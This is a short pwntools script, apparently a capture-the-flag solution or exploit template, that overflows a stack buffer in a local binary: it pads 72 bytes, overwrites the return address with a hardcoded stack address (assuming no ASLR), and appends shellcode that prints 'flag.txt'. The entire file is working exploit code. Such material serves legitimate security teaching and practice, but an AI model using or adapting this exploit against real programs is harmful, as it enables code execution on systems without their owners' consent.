from pwn import *

context.arch = 'amd64'

gen_filename = ""

e = ELF(gen_filename)
p = e.process(env={})

# this assumes no aslr
stack_base = 0x7ffffffde000 
buff = stack_base + 0x20d20

payload = b''
payload += 64 * b'a'  # buffer
payload +=  8 * b'b'  # rbp
dest = buff + len(payload) + 8
payload += p64(dest)  # rip
payload += asm(shellcraft.amd64.linux.cat("flag.txt"))
p.sendline(payload)

p.stream()

